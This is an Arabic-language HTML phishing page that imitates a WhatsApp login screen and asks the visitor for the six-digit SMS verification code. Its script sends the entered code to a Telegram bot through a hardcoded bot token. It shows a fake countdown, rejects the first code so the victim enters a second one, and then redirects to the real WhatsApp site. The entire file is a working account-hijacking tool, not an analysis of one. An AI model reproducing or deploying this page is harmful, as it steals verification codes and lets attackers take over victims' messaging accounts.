<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>WhatsApp Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        header {
            background-color: #25D366;
            color: white;
            width: 100%;
            padding: 10px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            position: fixed;
            top: 0;
        }

        header img {
            vertical-align: middle;
            margin-right: 10px;
        }

        .container {
            text-align: center;
            margin-top: 80px;
        }

        .container img {
            width: 80px;
            margin-bottom: 20px;
        }

        .container h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 10px;
        }

        .container p {
            font-size: 16px;
            color: #555;
            margin-bottom: 20px;
        }

        .container input {
            width: 90%;
            max-width: 300px;
            padding: 10px;
            font-size: 16px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 6px;
            margin-bottom: 15px;
        }

        .container button {
            width: 90%;
            max-width: 300px;
            padding: 10px;
            font-size: 18px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: #1DA955;
        }

        #countdown {
            color: red;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>

<body>
    <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" width="30">
        WhatsApp
    </header>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <h1>تسجيل الدخول</h1>
        <p>أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.</p>
        <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6">
        <button onclick="startVerification()">متابعة</button>
        <div id="countdown"></div>
    </div>

    <script>
        let attempts = 0;

        function startVerification() {
            const activationCodeInput = document.getElementById('activationCode');
            const activationCode = activationCodeInput.value;

            if (!activationCode || activationCode.length !== 6 || !/^\d{6}$/.test(activationCode)) {
                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
                return;
            }

            sendCodeToTelegram(activationCode);
            startCountdown(activationCodeInput);
        }

        function sendCodeToTelegram(code) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // توكن البوت
            const chatId = 'YOUR_CHAT_ID'; // استبدل YOUR_CHAT_ID بمعرّف الدردشة الخاص بك
            const message = `رمز التفعيل: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then((response) => {
                    if (response.ok) {
                        alert('تم إرسال الرمز بنجاح إلى تيليجرام!');
                    } else {
                        alert('حدث خطأ أثناء الإرسال. تحقق من الإعدادات.');
                    }
                })
                .catch((error) => {
                    console.error('فشل الاتصال بـ Telegram API:', error);
                    alert('فشل الإرسال. تحقق من اتصالك بالإنترنت.');
                });
        }

        function startCountdown(inputField) {
            let countdownValue = 10;
            const countdownDisplay = document.getElementById('countdown');
            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;

            const interval = setInterval(() => {
                countdownValue--;
                if (countdownValue <= 0) {
                    clearInterval(interval);
                    handleInvalidCode(inputField, countdownDisplay);
                } else {
                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
                }
            }, 1000);
        }

        function handleInvalidCode(inputField, countdownDisplay) {
            attempts++;
            if (attempts < 2) {
                countdownDisplay.textContent = '';
                alert('الرمز غير صحيح. تحقق من الرمز جيدًا.');
                inputField.value = '';
            } else {
                alert('تم إدخال الرمز بنجاح!');
                window.location.href = "https://www.whatsapp.com";
            }
        }
    </script>
</body>

</html>
